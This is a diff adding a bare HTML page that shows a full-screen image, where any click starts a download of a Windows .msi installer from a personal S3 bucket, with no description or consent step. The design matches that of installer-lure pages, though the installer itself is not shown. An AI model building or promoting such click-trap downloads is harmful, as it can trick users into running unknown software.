@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XY页面</title>
+    <style>
+        html, body {
+            width: 100vw;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        body {
+            width: 100vw;
+            height: 100vh;
+            background: url('XY.png') no-repeat center center;
+            background-size: cover;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body onclick="downloadFile()">
+    <script>
+        function downloadFile() {
+            window.location.href = 'https://s3.ap-east-1.amazonaws.com/my1sthb/2025-06-28/XYMNQ_Setups_windowsmvh_v2.1.1.msi';
+        }
+    </script>
+</body>
+</html> 
